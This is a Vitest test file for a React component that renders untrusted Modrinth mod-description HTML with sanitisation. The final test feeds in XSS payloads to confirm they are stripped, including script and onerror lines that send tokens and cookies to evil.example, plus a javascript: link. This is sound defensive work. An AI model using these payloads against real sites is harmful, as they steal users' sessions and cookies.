import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import { ModDescription } from './ModDescription';

const render = (body: string) => renderToStaticMarkup(createElement(ModDescription, { body }));

// The whole point of this component is that it renders HTML somebody else
// wrote. A Modrinth project body is authored by the mod's own developer and
// arrives through Core's read-through proxy, which caches it - so it is
// untrusted input rendered on the panel origin, where a script would run with
// the session.
//
// The two halves have to be checked together, because each one alone is easy to
// satisfy by breaking the other: dropping rehype-raw passes every escaping test
// and leaves the tags visible as text (the bug this component was written for),
// and dropping rehype-sanitize passes every rendering test and hands a mod
// author the panel.
describe('ModDescription', () => {
    it('renders the raw HTML a Modrinth body embeds', () => {
        // Reduced from the Plasmo Voice body, which opens with exactly this.
        const html = render(
            '<div align="center">' +
            '<img src="https://imgur.com/3ccgCRz.png" alt="Plasmo Voice Logo">' +
            '<a href="https://modrinth.com/mod/plasmo-voice">Modrinth</a>' +
            '</div>',
        );
        expect(html).toContain('<img');
        expect(html).toContain('https://imgur.com/3ccgCRz.png');
        expect(html).toContain('href="https://modrinth.com/mod/plasmo-voice"');
        // The failure mode this replaced: the markup shown as text.
        expect(html).not.toContain('&lt;img');
        expect(html).not.toContain('&lt;div');
    });

    it('still renders ordinary Markdown, including GFM tables', () => {
        const html = render('# Features\n\n| Add-on | What |\n| --- | --- |\n| groups | channels |\n');
        expect(html).toContain('<h1');
        expect(html).toContain('<table');
        expect(html).toContain('groups');
    });

    it('sends no referrer and defers the fetch for author-chosen image hosts', () => {
        const html = render('![shot](https://plasmovoice.com/landing/rmb-scroll.gif)');
        // Lowercased before matching: React's server renderer emits the
        // attribute in its React spelling (referrerPolicy) while the DOM
        // renderer emits the HTML one. Attribute names parse
        // case-insensitively, so both reach the browser as the same thing and
        // the test should not pin whichever renderer it happens to run under.
        expect(html.toLowerCase()).toContain('referrerpolicy="no-referrer"');
        expect(html).toContain('loading="lazy"');
    });

    it('opens every link in a new tab without handing over the opener', () => {
        const html = render('[docs](https://plasmovoice.com)');
        expect(html).toContain('target="_blank"');
        expect(html).toContain('rel="noopener noreferrer"');
    });

    it('drops script, event handlers and javascript: URLs', () => {
        const html = render(
            '<script>fetch("//evil.example/"+localStorage.token)</script>\n\n' +
            '<img src="x" onerror="fetch(`//evil.example/${document.cookie}`)">\n\n' +
            '<a href="javascript:alert(1)">click</a>\n\n' +
            '<iframe src="https://evil.example"></iframe>\n\n' +
            '<div style="position:fixed;inset:0">overlay</div>',
        );
        expect(html).not.toContain('<script');
        expect(html).not.toContain('onerror');
        expect(html).not.toContain('javascript:');
        expect(html).not.toContain('<iframe');
        // Not XSS, but a body that can position itself over the panel can
        // cover the buttons around it.
        expect(html).not.toContain('position:fixed');
    });
});
